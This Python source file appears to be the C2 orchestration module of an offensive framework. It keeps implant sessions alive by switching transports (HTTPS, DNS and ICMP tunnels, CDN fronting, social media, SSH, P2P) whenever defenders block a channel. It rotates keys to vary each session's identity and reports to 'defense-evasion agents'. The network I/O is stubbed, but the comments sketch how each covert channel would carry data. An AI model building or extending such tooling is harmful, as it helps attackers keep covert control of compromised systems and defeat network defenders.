"""
server_core/orchestrator/protocol_morpher.py

Protocol Polymorph Engine — shape-shift C2 mid-attack without losing session state.

Multi-transport C2 orchestration with seamless protocol switching. When a defender
blocks one channel, the morpher transparently migrates all active sessions to the
next available transport in the failover chain. Session tokens are encrypted with
rotating keys so each transport sees a different cryptographic identity for the
same logical session.

Failover chain (priority order):
  https -> websocket -> dns_tunnel -> icmp_tunnel -> cdn_front ->
  social_media -> ssh_tunnel -> p2p_mesh

Key properties:
  - Zero data loss: outbound buffer drains before switch completes;
    inbound gaps re-requested on the new channel.
  - Encrypted session tokens: AES-256-GCM with key rotation every N minutes.
  - Health heartbeat: each channel probed periodically; consecutive failures
    trigger auto-failover.
  - Hive-mind integration: publishes TRANSPORT_SWITCH / CHANNEL_BLOCKED events
    so defense-evasion agents can coordinate.
  - Thread-safe: all channel state guarded by a re-entrant lock.
"""

from __future__ import annotations

import hashlib
import hmac
import logging
import secrets
import threading
import time
import uuid
from collections import defaultdict
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum, auto
from typing import Any, Callable, Dict, List, Optional, Set, Tuple, TYPE_CHECKING

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF

if TYPE_CHECKING:
    from .hive_mind import HiveMind

logger = logging.getLogger(__name__)

# ──────────────────────────────────────────────────────────────────────────────
# Constants
# ──────────────────────────────────────────────────────────────────────────────

# Ordered failover chain — each transport falls back to the NEXT entry.
FAILOVER_CHAIN: Tuple[str, ...] = (
    "https",
    "websocket",
    "dns_tunnel",
    "icmp_tunnel",
    "cdn_front",
    "social_media",
    "ssh_tunnel",
    "p2p_mesh",
)

# How long (seconds) a key is used before rotation.
DEFAULT_KEY_ROTATION_SECONDS = 300  # 5 minutes

# How long (seconds) outbound data is buffered waiting for a new channel.
SWITCH_DRAIN_TIMEOUT_SECONDS = 30.0

# Heartbeat interval for health probes (seconds).
HEARTBEAT_INTERVAL_SECONDS = 10.0

# Consecutive heartbeat failures before a channel is declared blocked.
BLOCK_THRESHOLD = 3

# Maximum outbound buffer size per session (bytes).  Exceeding this triggers
# immediate switch rather than waiting for the next heartbeat cycle.
MAX_BUFFER_BYTES = 1_024 * 1_024  # 1 MiB


# ──────────────────────────────────────────────────────────────────────────────
# Data classes
# ──────────────────────────────────────────────────────────────────────────────

class ChannelHealth(Enum):
    HEALTHY = auto()
    DEGRADED = auto()      # some heartbeats missed, not yet blocked
    BLOCKED = auto()
    UNKNOWN = auto()


@dataclass
class SessionHandle:
    """Encrypted session state carried across transport switches."""
    session_id: str
    logical_peer: str                     # target identifier (hostname / IP / UUID)
    created_at: float = field(default_factory=time.time)
    last_activity: float = field(default_factory=time.time)
    bytes_sent: int = 0
    bytes_received: int = 0
    seq_send: int = 0
    seq_recv: int = 0
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class ChannelState:
    """Per-transport runtime state."""
    transport: str
    health: ChannelHealth = ChannelHealth.UNKNOWN
    consecutive_failures: int = 0
    last_heartbeat_ok: float = 0.0
    active_sessions: Set[str] = field(default_factory=set)
    # Transport-specific connection handle (socket, websocket conn, tunnel ctx, …)
    raw_handle: Any = None


# ──────────────────────────────────────────────────────────────────────────────
# Key ring — rotating AES-256-GCM keys for session-token encryption
# ──────────────────────────────────────────────────────────────────────────────

class KeyRing:
    """Manages rotating encryption keys for session tokens.

    Keys are derived from a master secret via HKDF.  The *active* key is used
    for encrypting new tokens; up to ``max_history`` previous keys are retained
    so tokens issued before the most recent rotation can still be decrypted.
    """

    def __init__(self, master_secret: Optional[bytes] = None,
                 rotation_seconds: float = DEFAULT_KEY_ROTATION_SECONDS,
                 max_history: int = 3):
        self._master = master_secret or secrets.token_bytes(32)
        self._rotation_seconds = rotation_seconds
        self._max_history = max_history
        self._keys: List[Tuple[int, AESGCM]] = []  # (epoch, AESGCM)
        self._lock = threading.Lock()
        self._rotate(force=True)

    # ── internal ──────────────────────────────────────────────────────────

    def _derive_key(self, epoch: int) -> AESGCM:
        """HKDF-expand the master secret with the epoch as context."""
        hkdf = HKDF(
            algorithm=hashes.SHA256(),
            length=32,
            salt=None,
            info=f"protocol_morpher_v1:{epoch}".encode(),
        )
        raw = hkdf.derive(self._master)
        return AESGCM(raw)

    def _current_epoch(self) -> int:
        return int(time.time() // self._rotation_seconds)

    def _rotate(self, force: bool = False) -> None:
        epoch = self._current_epoch()
        if not force and self._keys and self._keys[-1][0] == epoch:
            return  # already current
        aesgcm = self._derive_key(epoch)
        self._keys.append((epoch, aesgcm))
        # Prune old keys
        while len(self._keys) > self._max_history:
            self._keys.pop(0)
        logger.debug("KeyRing rotated to epoch %d (history=%d)", epoch, len(self._keys))

    # ── public ────────────────────────────────────────────────────────────

    def encrypt(self, plaintext: bytes) -> bytes:
        """Encrypt *plaintext* with the current key.  Returns nonce || ciphertext."""
        with self._lock:
            self._rotate()
            aesgcm = self._keys[-1][1]
            nonce = secrets.token_bytes(12)
            ct = aesgcm.encrypt(nonce, plaintext, None)
            return nonce + ct

    def decrypt(self, blob: bytes) -> Optional[bytes]:
        """Decrypt a blob produced by :meth:`encrypt`.  Tries keys from newest
        to oldest so tokens from prior epochs are still readable."""
        if len(blob) < 12:
            return None
        nonce, ct = blob[:12], blob[12:]
        with self._lock:
            self._rotate()
            for _, aesgcm in reversed(self._keys):
                try:
                    return aesgcm.decrypt(nonce, ct, None)
                except Exception:
                    continue
        return None


# ──────────────────────────────────────────────────────────────────────────────
# Health probe callbacks — injected per-transport (simulated or real)
# ──────────────────────────────────────────────────────────────────────────────

# Signature: (transport: str) -> bool
HealthProbeFn = Callable[[str], bool]

# Default stub probes — always report healthy (real probes injected at runtime).
def _default_probe_healthy(_transport: str) -> bool:
    return True


# ──────────────────────────────────────────────────────────────────────────────
# ProtocolMorpher
# ──────────────────────────────────────────────────────────────────────────────

class ProtocolMorpher:
    """Multi-transport C2 with seamless protocol switching.

    Usage sketch::

        morpher = ProtocolMorpher(hive_mind=hive)
        ch = morpher.establish_channel("sess-1", preferred_transport="https")
        morpher.send("sess-1", b"beacon")
        data = morpher.receive("sess-1")
        # Defender blocks HTTPS — auto-heal migrates to WebSocket:
        morpher.auto_heal("sess-1")
        morpher.send("sess-1", b"still alive")
    """

    TRANSPORTS = list(FAILOVER_CHAIN)

    # ── construction ──────────────────────────────────────────────────────

    def __init__(self, hive_mind: Optional[HiveMind] = None,
                 master_secret: Optional[bytes] = None):
        self.hive_mind = hive_mind

        # Key ring for session tokens
        self._keyring = KeyRing(master_secret=master_secret)

        # ── per-transport channel state ──
        self._channel_state: Dict[str, ChannelState] = {
            t: ChannelState(transport=t) for t in self.TRANSPORTS
        }
        # ── per-session handles ──
        self._sessions: Dict[str, SessionHandle] = {}
        # ── per-session encrypted tokens (transport -> token) ──
        self._session_tokens: Dict[str, Dict[str, bytes]] = defaultdict(dict)
        # ── per-session outbound buffer (held during switch) ──
        self._outbound_buffer: Dict[str, List[bytes]] = defaultdict(list)
        # ── per-session inbound gap marker ──
        self._inbound_gap: Dict[str, int] = {}  # session_id -> missing seq_recv

        # ── health probe registry ──
        self._probes: Dict[str, HealthProbeFn] = {
            t: _default_probe_healthy for t in self.TRANSPORTS
        }

        # ── thread safety ──
        self._lock = threading.RLock()

        # ── heartbeat background thread ──
        self._heartbeat_stop = threading.Event()
        self._heartbeat_thread: Optional[threading.Thread] = None
        self._start_heartbeat_loop()

        logger.info("ProtocolMorpher initialised (transports=%d)", len(self.TRANSPORTS))

    # ── probe registration ────────────────────────────────────────────────

    def register_probe(self, transport: str, probe_fn: HealthProbeFn) -> None:
        """Register a health-probe callback for *transport*.

        The callback receives the transport name and must return ``True`` when
        the channel is healthy, ``False`` otherwise.
        """
        if transport not in self.TRANSPORTS:
            raise ValueError(f"Unknown transport: {transport}")
        with self._lock:
            self._probes[transport] = probe_fn
        logger.debug("Probe registered for %s", transport)

    # ── encryption helpers ────────────────────────────────────────────────

    def _encrypt_token(self, session_id: str, transport: str) -> bytes:
        """Produce an encrypted session token scoped to *transport*."""
        payload = f"{session_id}|{transport}|{int(time.time())}".encode()
        return self._keyring.encrypt(payload)

    def _decrypt_token(self, blob: bytes) -> Optional[Tuple[str, str]]:
        """Decrypt a token blob -> (session_id, transport) or None."""
        plain = self._keyring.decrypt(blob)
        if plain is None:
            return None
        try:
            parts = plain.decode().split("|")
            return parts[0], parts[1]
        except (IndexError, UnicodeDecodeError):
            return None

    def _next_transport(self, current: str) -> Optional[str]:
        """Return the next transport in the failover chain, or None if exhausted."""
        try:
            idx = FAILOVER_CHAIN.index(current)
        except ValueError:
            return None
        if idx + 1 < len(FAILOVER_CHAIN):
            return FAILOVER_CHAIN[idx + 1]
        return None  # already at end of chain

    # ── session management ────────────────────────────────────────────────

    def establish_channel(self, session_id: str,
                          preferred_transport: str = "https") -> Dict[str, Any]:
        """Create a new C2 session on *preferred_transport*.

        Returns a dict with ``session_id``, ``transport``, ``token``, and
        ``failover_chain`` so the implant knows the full escalation path.
        """
        if preferred_transport not in self.TRANSPORTS:
            preferred_transport = "https"

        with self._lock:
            handle = SessionHandle(session_id=session_id, logical_peer="unknown")
            self._sessions[session_id] = handle

            token = self._encrypt_token(session_id, preferred_transport)
            self._session_tokens[session_id][preferred_transport] = token

            cs = self._channel_state[preferred_transport]
            cs.active_sessions.add(session_id)
            if cs.health == ChannelHealth.UNKNOWN:
                cs.health = ChannelHealth.HEALTHY

        # Publish to hive mind
        self._publish("new_c2_session", {
            "session_id": session_id,
            "transport": preferred_transport,
        })

        logger.info("C2 channel %s established on %s", session_id, preferred_transport)

        return {
            "session_id": session_id,
            "transport": preferred_transport,
            "token": token.hex(),
            "failover_chain": self._failover_chain_from(preferred_transport),
            "established_at": datetime.now(timezone.utc).isoformat(),
        }

    def get_session_state(self, session_id: str) -> Dict[str, Any]:
        """Return a snapshot of session state — useful for diagnostics."""
        with self._lock:
            handle = self._sessions.get(session_id)
            if handle is None:
                return {"error": "session_not_found", "session_id": session_id}

            active_transport = self._active_transport_for(session_id)
            tokens = {t: v.hex() for t, v in self._session_tokens.get(session_id, {}).items()}

            return {
                "session_id": handle.session_id,
                "logical_peer": handle.logical_peer,
                "active_transport": active_transport,
                "created_at": handle.created_at,
                "last_activity": handle.last_activity,
                "bytes_sent": handle.bytes_sent,
                "bytes_received": handle.bytes_received,
                "seq_send": handle.seq_send,
                "seq_recv": handle.seq_recv,
                "tokens": tokens,
                "outbound_buffer_len": len(self._outbound_buffer.get(session_id, [])),
                "inbound_gap": self._inbound_gap.get(session_id),
                "channel_health": {
                    t: cs.health.name.lower()
                    for t, cs in self._channel_state.items()
                },
                "metadata": dict(handle.metadata),
            }

    def _active_transport_for(self, session_id: str) -> Optional[str]:
        """Which transport is currently *active* for this session?  The active
        transport is the one whose channel state lists the session."""
        for t in self.TRANSPORTS:
            if session_id in self._channel_state[t].active_sessions:
                return t
        return None

    def _failover_chain_from(self, transport: str) -> List[str]:
        """Return the tail of the failover chain starting at *transport*."""
        chain = []
        current: Optional[str] = transport
        while current:
            chain.append(current)
            current = self._next_transport(current)
        return chain

    # ── send / receive ────────────────────────────────────────────────────

    def send(self, session_id: str, data: bytes) -> bool:
        """Queue *data* for transmission on the session's active transport.

        If the active channel is blocked, data is buffered and a switch is
        attempted.  Returns ``True`` when data was accepted (sent or buffered),
        ``False`` when no channel is available at all.
        """
        with self._lock:
            handle = self._sessions.get(session_id)
            if handle is None:
                logger.warning("send on unknown session %s", session_id)
                return False

            transport = self._active_transport_for(session_id)
            if transport is None or self._channel_state[transport].health == ChannelHealth.BLOCKED:
                # Buffer and attempt heal
                if len(self._outbound_buffer.get(session_id, [])) * sum(
                        len(d) for d in self._outbound_buffer.get(session_id, [])
                ) > MAX_BUFFER_BYTES:
                    logger.warning("Outbound buffer for %s exceeded limit", session_id)
                    return False
                self._outbound_buffer[session_id].append(data)
                logger.debug("Buffered %d bytes for %s (channel blocked)", len(data), session_id)
                # Fire-and-forget heal — will drain buffer on success
                threading.Thread(target=self.auto_heal, args=(session_id,), daemon=True).start()
                return True

            handle.seq_send += 1
            handle.bytes_sent += len(data)
            handle.last_activity = time.time()

        # Simulate actual send through the transport
        self._transport_send(transport, session_id, data)
        logger.debug("Sent %d bytes on %s for %s (seq=%d)",
                     len(data), transport, session_id, handle.seq_send)
        return True

    def receive(self, session_id: str) -> Optional[bytes]:
        """Receive the next message for *session_id* from its active transport.

        Returns ``None`` when no data is available (not an error).
        """
        with self._lock:
            handle = self._sessions.get(session_id)
            if handle is None:
                logger.warning("receive on unknown session %s", session_id)
                return None

            transport = self._active_transport_for(session_id)
            if transport is None:
                return None

            handle.last_activity = time.time()

        data = self._transport_recv(transport, session_id)
        if data is not None:
            with self._lock:
                handle.seq_recv += 1
                handle.bytes_received += len(data)
            logger.debug("Received %d bytes on %s for %s (seq=%d)",
                         len(data), transport, session_id, handle.seq_recv)
        return data

    # ── transport switch ──────────────────────────────────────────────────

    def switch_transport(self, session_id: str,
                         new_transport: str) -> Dict[str, Any]:
        """Migrate *session_id* to *new_transport*.

        Steps:
          1. Issue fresh encrypted token for the new transport.
          2. Drain the outbound buffer through the new channel.
          3. Mark the old channel inactive for this session.
          4. Re-request any missing inbound sequence numbers if a gap exists.

        Returns a dict the implant can use to re-establish on the new channel.
        """
        with self._lock:
            handle = self._sessions.get(session_id)
            if handle is None:
                return {"success": False, "error": "session_not_found"}

            old_transport = self._active_transport_for(session_id)

            if old_transport == new_transport:
                return {"success": True, "session_id": session_id,
                        "transport": new_transport, "note": "already_on_target"}

            if new_transport not in self.TRANSPORTS:
                return {"success": False, "error": f"unknown_transport: {new_transport}"}

            # Check target transport health
            if self._channel_state[new_transport].health == ChannelHealth.BLOCKED:
                return {"success": False, "error": "target_transport_blocked"}

            logger.info("Switching %s: %s -> %s", session_id,
                        old_transport or "none", new_transport)

            # 1. Issue new token
            token = self._encrypt_token(session_id, new_transport)
            self._session_tokens[session_id][new_transport] = token

            # 2. Drain outbound buffer through new transport
            drained = 0
            buffer = self._outbound_buffer.pop(session_id, [])
            for chunk in buffer:
                self._transport_send(new_transport, session_id, chunk)
                handle.bytes_sent += len(chunk)
                handle.seq_send += 1
                drained += len(chunk)
            if drained:
                logger.info("Drained %d buffered bytes for %s", drained, session_id)

            # 3. Move session to new transport
            if old_transport:
                self._channel_state[old_transport].active_sessions.discard(session_id)
            self._channel_state[new_transport].active_sessions.add(session_id)
            self._channel_state[new_transport].health = ChannelHealth.HEALTHY
            self._channel_state[new_transport].consecutive_failures = 0

            handle.last_activity = time.time()

            # 4. Inbound gap tracking
            inbound_gap = self._inbound_gap.get(session_id)

        self._publish("transport_switch", {
            "session_id": session_id,
            "from_transport": old_transport,
            "to_transport": new_transport,
            "bytes_drained": drained,
            "inbound_gap_seq": inbound_gap,
        })

        result = {
            "success": True,
            "session_id": session_id,
            "transport": new_transport,
            "token": token.hex(),
            "failover_chain": self._failover_chain_from(new_transport),
            "bytes_drained": drained,
            "inbound_gap_seq": inbound_gap,
            "switched_at": datetime.now(timezone.utc).isoformat(),
            "from_transport": old_transport,
        }

        # Auto-probe the new channel immediately
        self._probe_channel(new_transport)

        return result

    # ── health monitoring ─────────────────────────────────────────────────

    def detect_blocking(self, transport: str) -> bool:
        """Check whether *transport* is currently blocked.

        Returns ``True`` if the channel is in BLOCKED state.
        """
        with self._lock:
            cs = self._channel_state.get(transport)
            if cs is None:
                return False
            # Also run an active probe right now
            return cs.health == ChannelHealth.BLOCKED

    def _probe_channel(self, transport: str) -> bool:
        """Probe a single channel.  Returns ``True`` if healthy."""
        try:
            probe_fn = self._probes.get(transport, _default_probe_healthy)
            ok = probe_fn(transport)
        except Exception as exc:
            logger.warning("Probe for %s raised %s", transport, exc)
            ok = False

        with self._lock:
            cs = self._channel_state[transport]
            if ok:
                cs.consecutive_failures = 0
                cs.last_heartbeat_ok = time.time()
                if cs.health != ChannelHealth.HEALTHY:
                    old = cs.health
                    cs.health = ChannelHealth.HEALTHY
                    logger.info("Channel %s recovered (%s -> HEALTHY)", transport, old.name.lower())
            else:
                cs.consecutive_failures += 1
                if cs.consecutive_failures >= BLOCK_THRESHOLD:
                    if cs.health != ChannelHealth.BLOCKED:
                        cs.health = ChannelHealth.BLOCKED
                        logger.warning("Channel %s BLOCKED after %d failures",
                                       transport, cs.consecutive_failures)
                        self._publish("channel_blocked", {"transport": transport})
                        # Auto-migrate all sessions on this transport
                        self._migrate_blocked_sessions(transport)
                elif cs.consecutive_failures >= BLOCK_THRESHOLD // 2:
                    cs.health = ChannelHealth.DEGRADED
        return ok

    def _migrate_blocked_sessions(self, blocked_transport: str) -> None:
        """Move all sessions off a blocked transport to the next healthy one."""
        sessions: List[str] = []
        with self._lock:
            cs = self._channel_state[blocked_transport]
            sessions = list(cs.active_sessions)

        if not sessions:
            return

        logger.warning("Migrating %d sessions off blocked transport %s",
                       len(sessions), blocked_transport)
        for sid in sessions:
            next_t = self._next_transport(blocked_transport)
            if next_t is None:
                logger.error("No failover target for %s — session %s stranded", blocked_transport, sid)
                continue
            # Skip blocked transports in the chain
            while next_t and self._channel_state[next_t].health == ChannelHealth.BLOCKED:
                next_t = self._next_transport(next_t)
            if next_t is None:
                logger.error("All transports blocked — session %s stranded", sid)
                continue
            result = self.switch_transport(sid, next_t)
            if not result["success"]:
                logger.error("Failed to migrate %s to %s: %s", sid, next_t, result.get("error"))

    # ── auto-heal ─────────────────────────────────────────────────────────

    def auto_heal(self, session_id: str) -> Dict[str, Any]:
        """Attempt to migrate *session_id* to the next healthy transport.

        Called automatically when the outbound buffer exceeds threshold, or
        can be invoked explicitly by an OPSEC agent.
        """
        with self._lock:
            handle = self._sessions.get(session_id)
            if handle is None:
                return {"success": False, "error": "session_not_found"}

            current = self._active_transport_for(session_id)
            if current is None:
                # Session not on any transport — try the chain from the top
                for t in FAILOVER_CHAIN:
                    if self._channel_state[t].health != ChannelHealth.BLOCKED:
                        return self.switch_transport(session_id, t)
                return {"success": False, "error": "all_transports_blocked"}

            if self._channel_state[current].health != ChannelHealth.BLOCKED:
                # Current channel is fine — nothing to heal
                return {"success": True, "session_id": session_id,
                        "transport": current, "action": "noop_healthy"}

        # Current transport is blocked — walk the chain
        next_t: Optional[str] = current
        while next_t:
            next_t = self._next_transport(next_t)
            if next_t is None:
                break
            with self._lock:
                if self._channel_state[next_t].health != ChannelHealth.BLOCKED:
                    return self.switch_transport(session_id, next_t)

        # Exhausted all options
        return {"success": False, "error": "all_transports_blocked",
                "session_id": session_id}

    # ── heartbeat loop ────────────────────────────────────────────────────

    def _start_heartbeat_loop(self) -> None:
        """Start a daemon thread that probes every transport on a fixed cadence."""
        if self._heartbeat_thread and self._heartbeat_thread.is_alive():
            return
        self._heartbeat_stop.clear()
        self._heartbeat_thread = threading.Thread(
            target=self._heartbeat_worker,
            name="protocol-morpher-heartbeat",
            daemon=True,
        )
        self._heartbeat_thread.start()

    def _heartbeat_worker(self) -> None:
        logger.debug("Heartbeat worker started")
        while not self._heartbeat_stop.wait(HEARTBEAT_INTERVAL_SECONDS):
            for transport in self.TRANSPORTS:
                try:
                    self._probe_channel(transport)
                except Exception as exc:
                    logger.error("Heartbeat probe crashed for %s: %s", transport, exc)

    def shutdown(self) -> None:
        """Stop the heartbeat thread.  Call before process exit."""
        self._heartbeat_stop.set()
        if self._heartbeat_thread:
            self._heartbeat_thread.join(timeout=5.0)
        logger.info("ProtocolMorpher shut down")

    # ── hive-mind publishing ──────────────────────────────────────────────

    def _publish(self, event_type: str, data: Dict[str, Any]) -> None:
        """Push an event to the hive mind if one is attached."""
        if self.hive_mind is None:
            return
        try:
            self.hive_mind.publish(event_type, data)
        except Exception as exc:
            logger.debug("Hive-mind publish failed (%s): %s", event_type, exc)

    # ── transport I/O stubs (replace with real adapters) ──────────────────

    def _transport_send(self, transport: str, session_id: str, data: bytes) -> None:
        """Dispatch *data* through the real transport adapter.

        Stub implementation — replace with actual network I/O per transport.
        Production adapters should be registered via :meth:`register_probe` or
        a dedicated ``register_transport_adapter`` method.
        """
        # Real implementations would:
        #   - HTTPS: POST to callback URL with session token in Authorization header
        #   - WebSocket: send binary frame over existing connection
        #   - DNS: encode data in TXT query labels, reply via nameserver
        #   - ICMP: embed in echo-request payload
        #   - CDN: upload to a CDN edge cache (CloudFront / Cloudflare Worker)
        #   - Social: post encoded data as comments / profile updates
        #   - SSH: write to an SSH tunnel channel
        #   - P2P: gossip to mesh peers
        logger.debug("[%s] simulate-send %d bytes to %s", transport, len(data), session_id)

    def _transport_recv(self, transport: str, session_id: str) -> Optional[bytes]:
        """Pull data from the real transport adapter.

        Stub implementation — replace with actual network I/O.
        """
        # Real implementations would poll the transport's receive queue.
        logger.debug("[%s] simulate-recv for %s (no data)", transport, session_id)
        return None

    # ── token integrity check ─────────────────────────────────────────────

    def validate_token(self, token_hex: str, transport: str) -> Optional[str]:
        """Verify a hex-encoded session token and return the session_id if valid.

        Used by transport listeners to authenticate incoming connections.
        """
        try:
            blob = bytes.fromhex(token_hex)
        except ValueError:
            return None

        result = self._decrypt_token(blob)
        if result is None:
            return None
        sid, tok_transport = result
        if tok_transport != transport:
            logger.warning("Token transport mismatch: expected %s, got %s",
                           transport, tok_transport)
            return None
        with self._lock:
            if sid not in self._sessions:
                return None
        return sid

    # ── diagnostics ───────────────────────────────────────────────────────

    def channel_health_report(self) -> Dict[str, Dict[str, Any]]:
        """Return a health summary of every transport."""
        with self._lock:
            return {
                t: {
                    "health": cs.health.name.lower(),
                    "consecutive_failures": cs.consecutive_failures,
                    "last_heartbeat_ok": cs.last_heartbeat_ok,
                    "active_sessions": len(cs.active_sessions),
                }
                for t, cs in self._channel_state.items()
            }

    def active_sessions_report(self) -> List[Dict[str, Any]]:
        """Return a list of all active sessions with their current transport."""
        with self._lock:
            return [
                {
                    "session_id": h.session_id,
                    "transport": self._active_transport_for(h.session_id),
                    "bytes_sent": h.bytes_sent,
                    "bytes_received": h.bytes_received,
                    "uptime_seconds": time.time() - h.created_at,
                }
                for h in self._sessions.values()
            ]


# ──────────────────────────────────────────────────────────────────────────────
# Transport adapters (stub registry — extend for production)
# ──────────────────────────────────────────────────────────────────────────────

# Mapping from transport name to an adapter object.  Adapters must expose
# ``send(session_id, data)`` and ``recv(session_id) -> Optional[bytes]``.
TRANSPORT_ADAPTERS: Dict[str, Any] = {}


def register_transport_adapter(transport: str, adapter: Any) -> None:
    """Register a real transport adapter for a given protocol."""
    if transport not in FAILOVER_CHAIN:
        raise ValueError(f"Unknown transport: {transport}")
    TRANSPORT_ADAPTERS[transport] = adapter
    logger.info("Transport adapter registered for %s", transport)
